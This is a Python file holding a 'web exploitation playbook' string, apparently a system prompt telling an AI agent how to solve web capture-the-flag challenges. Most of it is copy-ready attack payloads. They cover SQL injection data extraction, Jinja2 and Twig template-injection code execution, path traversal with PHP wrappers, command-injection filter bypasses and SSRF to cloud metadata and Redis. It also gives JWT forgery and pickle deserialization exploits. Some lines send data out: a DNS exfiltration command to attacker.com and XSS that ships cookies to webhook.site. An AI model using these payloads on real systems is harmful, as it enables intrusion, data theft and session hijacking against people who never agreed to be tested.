"""Web exploitation playbook — expert-level methodology."""

PLAYBOOK = r"""\
## Web Exploitation Playbook

You are solving a web CTF challenge. Follow this methodology precisely,
working from reconnaissance to exploitation.

---

### PHASE 1: Reconnaissance (always do ALL of these first)

1. **Initial Request & Source Inspection**
   ```
   curl -sD- <URL>                         # full headers + body
   curl -s <URL> | grep -i "flag\|secret\|hidden\|comment\|TODO\|FIXME"
   ```
   - Read every line of HTML source — flags hide in comments `<!-- -->`.
   - Note the `Server`, `X-Powered-By`, `Set-Cookie` headers.
   - Check `Content-Security-Policy` — it tells you what's allowed.

2. **Technology Fingerprinting**
   - Cookie names reveal framework:
     - `PHPSESSID` → PHP, `connect.sid` → Express/Node, `csrftoken` → Django,
       `_rails_session` → Rails, `JSESSIONID` → Java.
   - Error pages: trigger a 404/500, read the stack trace.
   - File extensions in URLs: `.php`, `.asp`, `.jsp` confirm stack.

3. **Path Discovery**
   ```
   # Check common paths first, then brute-force
   curl -s <URL>/robots.txt
   curl -s <URL>/sitemap.xml
   curl -s <URL>/.git/HEAD          # Git exposure → dump with git-dumper
   curl -s <URL>/.env               # leaked env vars
   curl -s <URL>/backup.zip         # source code leak
   curl -s <URL>/flag.txt
   curl -s <URL>/admin
   curl -s <URL>/api/               # REST API root
   curl -s <URL>/graphql            # GraphQL endpoint
   curl -s <URL>/swagger.json       # API docs
   gobuster dir -u <URL> -w /usr/share/wordlists/dirb/common.txt -t 20
   ```

4. **JavaScript Analysis**
   - Download every `.js` file referenced in the HTML.
   - Search for: API keys, endpoints, hidden routes, hardcoded secrets.
   - Look for client-side validation that can be bypassed.
   - Check for source maps (`.js.map`) — full original source.

---

### PHASE 2: Vulnerability Identification & Exploitation

Test each class **in order of likelihood for CTF challenges**:

#### 2.1 SQL Injection (most common in CTF)
**Detection:**
```
' OR '1'='1' --          # basic auth bypass
' UNION SELECT null --    # UNION detection
' AND sleep(3) --         # blind time-based
1; WAITFOR DELAY '0:0:3'  # MSSQL
```
**Exploitation patterns:**
```sql
-- Column count enumeration
' UNION SELECT null--
' UNION SELECT null,null--
' UNION SELECT null,null,null--

-- Data extraction (MySQL)
' UNION SELECT group_concat(table_name),null FROM information_schema.tables WHERE table_schema=database()--
' UNION SELECT group_concat(column_name),null FROM information_schema.columns WHERE table_name='users'--
' UNION SELECT group_concat(username,0x3a,password),null FROM users--

-- File read (MySQL)
' UNION SELECT load_file('/etc/passwd'),null--
' UNION SELECT load_file('/flag.txt'),null--

-- SQLite (common in CTF)
' UNION SELECT sql,null FROM sqlite_master--
' UNION SELECT group_concat(flag),null FROM flags--
```
- If WAF blocks keywords: `SeLeCt`, `/**/UNION/**/SELECT`, double-URL-encode.
- Use `sqlmap -u "<URL>?id=1" --batch --dump` when manual is slow.

#### 2.2 Server-Side Template Injection (SSTI)
**Detection probes (test ALL — different engines differ):**
```
{{7*7}}               # Jinja2, Twig → 49
${7*7}                # Mako, FreeMarker → 49
<%= 7*7 %>            # ERB (Ruby) → 49
#{7*7}                # Slim, Pug → 49
{{constructor.constructor('return 7*7')()}}  # Nunjucks
```
**Jinja2 RCE (most common in CTF Python):**
```python
# Method 1: via __subclasses__
{{''.__class__.__mro__[1].__subclasses__()}}
# Find subprocess.Popen index (usually ~400+), then:
{{''.__class__.__mro__[1].__subclasses__()[<IDX>]('cat /flag.txt',shell=True,stdout=-1).communicate()}}

# Method 2: via lipsum/config (Flask)
{{lipsum.__globals__['os'].popen('cat /flag.txt').read()}}
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
{{request.application.__globals__.__builtins__.__import__('os').popen('cat /flag*').read()}}
```
**Twig RCE (PHP):**
```
{{['cat /flag.txt']|filter('system')}}
```

#### 2.3 Local File Inclusion / Path Traversal
```
?page=../../../etc/passwd
?page=....//....//....//etc/passwd   # bypass simple replace
?page=..%2f..%2f..%2fetc/passwd      # URL-encoded
?page=php://filter/convert.base64-encode/resource=index.php  # PHP source read
?page=php://input                     # POST body becomes code (needs allow_url_include)
?page=/proc/self/environ              # leak env vars
?page=/flag.txt
```
- **PHP wrappers** are gold: `php://filter/read=convert.base64-encode/resource=config.php`
  gives you full source code base64-encoded.

#### 2.4 Command Injection
**Detection:**
```
; id                    # command separator
| id                    # pipe
$(id)                   # subshell
`id`                    # backtick
%0a id                  # newline
&& id                   # chain
|| id                   # OR chain
```
**Bypass filters:**
```bash
# If spaces are filtered
cat${IFS}/flag.txt
{cat,/flag.txt}
cat</flag.txt

# If keywords are filtered
c'a't /flag.txt
c\at /flag.txt
/bin/ca? /fla?.txt

# If outbound is blocked, use DNS/timing exfil
ping $(cat /flag.txt | base64).attacker.com
sleep $(cat /flag.txt | wc -c)
```

#### 2.5 Server-Side Request Forgery (SSRF)
```
# Common SSRF targets
http://127.0.0.1/admin
http://localhost:6379/          # Redis
http://169.254.169.254/latest/meta-data/  # AWS metadata
file:///etc/passwd
file:///flag.txt
gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aFLUSHALL%0d%0a  # Redis via gopher
```
- Bypass filters: `0x7f000001`, `0177.0.0.1`, `127.1`, `[::]`, DNS rebinding.

#### 2.6 Authentication & Session Attacks

**JWT manipulation:**
```python
# Decode JWT (it's just base64)
import base64, json
header, payload, sig = token.split('.')
# Pad and decode
h = json.loads(base64.urlsafe_b64decode(header + '=='))
p = json.loads(base64.urlsafe_b64decode(payload + '=='))

# Attack 1: alg=none
h['alg'] = 'none'
# Re-encode header.payload. (empty sig)

# Attack 2: HS256/RS256 confusion
# If server uses RS256, change to HS256 and sign with public key

# Attack 3: weak secret → brute-force with john/hashcat
# john jwt.txt --wordlist=rockyou.txt --format=HMAC-SHA256
```

**PHP type juggling:**
```
# POST password as integer 0 — loose comparison with string gives true
password=0         # "secret" == 0 is TRUE in PHP
# Or: magic hash collision
password=0e12345   # treated as 0 in numeric context
```

#### 2.7 Cross-Site Scripting (XSS)
Less common for getting flags directly, but sometimes needed:
```html
<script>fetch('/admin/flag').then(r=>r.text()).then(d=>fetch('https://webhook.site/ID?f='+btoa(d)))</script>
<img src=x onerror="location='https://webhook.site/ID?c='+document.cookie">
```

#### 2.8 Deserialization
**PHP:**
```php
# Look for unserialize() calls
# Craft serialized object with __destruct() or __wakeup() gadgets
O:4:"User":1:{s:4:"role";s:5:"admin";}
```
**Python pickle:**
```python
import pickle, os, base64
class Exploit:
    def __reduce__(self):
        return (os.system, ('cat /flag.txt',))
print(base64.b64encode(pickle.dumps(Exploit())))
```
**Node.js:** `{"__proto__":{"isAdmin":true}}` — prototype pollution.

---

### PHASE 3: Flag Extraction

Once you have code execution or data access:
```bash
cat /flag* /home/*/flag* 2>/dev/null
find / -name "*flag*" 2>/dev/null
grep -r "flag{" / 2>/dev/null
env | grep -i flag
# Check database if web app uses one
sqlite3 /path/to/db.sqlite3 "SELECT * FROM flags"
```

---

### Decision Tree
```
Has login page?
├── Yes → Try SQLi on login, default creds, JWT manipulation
└── No → Has input fields?
    ├── Yes → Test SSTI, SQLi, command injection, XSS
    └── No → Has file parameter?
        ├── Yes → Test LFI/path traversal, SSRF
        └── No → Check source code, hidden paths, robots.txt
```
"""
